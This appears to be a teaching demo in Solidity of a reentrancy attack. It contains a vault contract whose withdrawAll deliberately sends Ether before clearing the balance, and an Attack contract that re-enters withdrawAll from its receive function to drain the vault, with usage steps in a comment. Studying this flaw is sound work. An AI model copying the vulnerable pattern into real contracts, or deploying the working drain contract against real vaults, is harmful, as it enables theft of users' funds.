 // SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

/*
    How to use it

    Deploy InsecureEtherVault
    Deposit money
    Show address of the smart-contract
    
    Deploy Attack with the deployed address of the InsecureEtherVault
    - Because Attack will call methods of that class
    Deposit money at least 1 ether, because you have to deposit initially money

    Call attack multiple times.

    See balance of InsecureEtherVault decreases
    See balance of Attack increases 

*/
contract InsecureEtherVault {
    mapping (address => uint256) private userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdrawAll() external {
        uint256 balance = getUserBalance(msg.sender);
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        userBalances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getDeployedAddress() external view returns(address){
        return address(this);
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return userBalances[_user];
    }
}

interface IEtherVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attack {
    IEtherVault public immutable etherVault;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }


    function depositInitial() external payable{

    }
    
    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            etherVault.withdrawAll();
        }
    }

    function attack() external payable {
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getDeployedAddress() external view returns(address){
        return address(this);
    }
}